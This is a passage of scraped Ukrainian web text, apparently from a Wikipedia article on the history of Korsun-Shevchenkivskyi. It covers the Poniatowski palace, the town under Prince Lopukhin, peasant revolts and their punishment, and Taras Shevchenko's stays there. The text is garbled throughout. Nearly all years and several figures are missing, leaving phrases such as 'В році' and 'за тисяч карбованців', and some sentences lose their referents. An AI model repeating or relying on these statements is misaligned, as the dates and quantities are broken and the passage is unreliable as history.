	<p>Однак добудовував палац вже шотландський архітектор на польській службі Ян Дісіор Ліндсей. За люстрацією року на одному з островів, який називали «Острів», стояв двоповерховий мурований палац, що мав 26 покоїв, 3 муровані будинки, 2 стайні. Зала була висотою в два поверхи, 15 на 10 метрів. Стайні для коней мали по 50 метрів довжини. Другий острів називався «Деніс» на ньому був закладений парк з оранжереями та теплицями. Крім того, було ще 5 менших островів без назви. В палаці містилася велика колекція археологічних знахідок, викопаних в околицях Корсуня, у тому числі золотих виробів.</p>
<p>Всього в місті нараховувалось будинків, з них 23 шляхетські, 34 єврейські, 25 мурованих. В центрі міста — ринкова площа у формі квадрата, по трьох сторонах були муровані будинки, а з четвертої «замок» — будинок губернатора, оточений глибоким ровом. Воно входило до Богуславського повіту Київського намісництва з  р. Корсуньський маєток купив у Понятовського за тисяч карбованців сріблом російський імператор Павло І. Він у році подарував його міністру юстиції генерал-прокурору Росії князю П.</p>
<p>Лопухіну, який знову закріпачив селян. Місцеві міщани і селяни були незадоволені новим становищем і борючись проти закріпачення протягом п'яти років доводили свої вольності, посилали скарги до Петербурга. В році сюди прибула спеціальна урядова комісія із каральним загоном і привела корсунців до покори. Організаторів виступів К. Тетянченка і Г. Калюжного було заслано на вічне поселення до Сибіру , 29 чоловік кинуто до богуславської в'язниці, решту покарано канчуками і різками.</p>
<p>В році князь Лопухін збудував у Корсуні суконну фабрику. Тоді серед них поширилися чутки, що той, хто запишеться до ополчення для участі в Кримській війні, буде звільнений від кріпацтва. У Корсуні селяни зібрали натовп понад 4 тисяч із мешканців Корсуня, Ситників, Моринців, Виграєва , Киченців, Корнилівки, Гарбузини, Бровахи і зажадали від князя дати їм грамоту на звільнення. Сталася сутичка з поліцією, у результаті якої було вбито 13, поранено 27 селян.</p><strong><a id='f4'></a><h2>Корсунь-Шевченківський — Вікіпедія</h2></strong><p>Після цього всіх учасників виступу було покарано: 60 чоловік віддали військово-польовому суду, решту покарали шомполами й різками. У Корсуні неодноразово бував український поет, художник та мислитель Тарас Шевченко , зокрема, з 28 червня по 8 липня року тут він гостював у свого троюрідного брата і свояка Варфоломія Григоровича Шевченка, який працював помічником управителя князя. Шевченко записував народні пісні, багато малював. Він дуже любив прогулюватися Корсунським парком, замальовуючи його прекрасні куточки. Збереглися малюнки, зроблені ним у Корсуні, які були вміщені до Корсунського Суліївського альбому.</p>
